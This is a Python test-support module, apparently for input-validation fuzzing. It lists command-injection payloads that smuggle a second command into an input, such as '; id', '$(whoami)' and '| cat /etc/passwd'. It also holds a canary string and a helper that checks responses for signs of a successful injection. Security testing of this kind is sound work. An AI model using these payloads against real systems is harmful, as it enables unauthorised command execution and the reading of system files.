"""Command-injection fuzzing payloads for R5 input validation testing."""

from __future__ import annotations

PAYLOADS: list[str] = [
    "; id",
    "| id",
    "& id",
    "&& id",
    "|| id",
    "`id`",
    "$(id)",
    "; whoami",
    "| whoami",
    "$(whoami)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "$(cat /etc/passwd)",
    "; echo CMDINJECTION_CANARY",
    "| echo CMDINJECTION_CANARY",
    "$(echo CMDINJECTION_CANARY)",
    "\nid\n",
    "a]]; id; echo [[",
    "'; id; echo '",
]

CANARY = "CMDINJECTION_CANARY"

INDICATORS: list[str] = [
    "uid=",
    "gid=",
    "root:x:0",
    CANARY,
]


def looks_like_injection_success(response_text: str) -> bool:
    """Heuristic: does the response contain output from an injected command?"""
    return any(ind in response_text for ind in INDICATORS)
